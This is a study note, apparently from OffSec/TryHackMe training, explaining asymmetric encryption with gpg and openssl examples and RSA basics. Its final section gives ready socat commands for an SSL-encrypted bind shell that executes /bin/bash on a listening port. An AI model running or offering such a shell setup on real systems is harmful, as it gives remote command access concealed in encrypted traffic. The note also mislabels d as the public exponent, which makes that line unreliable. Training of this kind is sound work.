## Asymmetric Encryption

Asymmetric encryption can solve integrity, authenticity and nonrepudiation

Theory
- Public key to distribute 
- Private key is kept confidential
- `$A` (Holds private to decrypt, and public key to distribute) ` -> exchange  ->` `$B` (Holds public key to encrypt) 
```bash
gpg --gen-key
gpg --output example-pub.asc --armor --export Offsec # armor flag for output being in ASCII

echo "Asymmetric encryption example" > asymmetry.txt
gpg --recipient Offsec --encrypt asymmetry.txt
# transfer file
gpg --decrypt asymmetry.txt.gpg # requires passphrase
```
It can sometimes be tricky to recall who has to use which keys to encrypt and decrypt messages with asymmetric encryption. We can use the following mnemonics to help us remember: 
SUPER 
1. S = Sender 
1. U = Uses 
1. P = Public
1. E = Encryption-key of 
1. R = Receiver.

```goat
Alice -> Bob
1. Alice encrypts with Bob's public key
2. Bob decrypts with Bob's private key
Bob  -> Alice
1. Bob encrypts with Alice's public key
2. Alice decrypts with Alice's private key
```

Asymmetric key-pairs can also be used to sign and verify messages.
A will sign the message with private key and B verifies it with the public key - Signing != sending the private key!!

#### Asymmetric Encryption Mathematics

RSA got its name from its inventors, Rivest, Shamir, and Adleman

Prime Factorisation:

```bash
x * y = z # z being the unqiue product of two prime numbers, so for:
primes={p,q}
product=n

# Using n as base:
# Perform additional maths to output two special numbers e and d 
# !! such that their properties are relative to n
# Public key as a:
tuple(n,e)
# Private key as a: 
tuple(n,d)

# THM - to see real values for p and q:
# Generate a RSA
openssl genrsa -out private-key.pem 2048
# Using RSA make public key from private key
openssl rsa -in private-key.pem -pubout -out public-key.pem
# For the values of:
# p, q, n, e, d := prime1, prime2, modulus, publicExponent, publicExponent
# in the following command
openssl rsa -in private-key.pem -text -noout
```

#### Asymmetric Encrypted Bind Shells

Encrypted communication rely on the Secure Sockets Layer (SSL)
```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 30 -out bind_shell.crt

# req = create a new certificate
# -newkey generate a new private key
# rsa:2048 defines the encryption algorithm we want to use. This is similar to the --cipher-algo flag used by gpg. In this case, we're using the RSA algorithm with a 2048-bit key length.
# -nodes create the private key without a passphrase
# -key save the generated private key to an output file in Base64 format.
# -x509 ensures that our certificate is self-signed; an  alternative is to use an existing certificate authority
# -days certificate is valid for
# -out saves the certificate to file, also in Base64 format
# This creates a bind_shell.crt(certificate) and bind_shell.key(private key)

socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin//bash

# Host certificate with socat 

socat - OPENSSL:$IP:$PORT,verify=0 <cmd>
```

## References

[THM Room Introduction to Cryptography](https://tryhackme.com/room/cryptographyintr)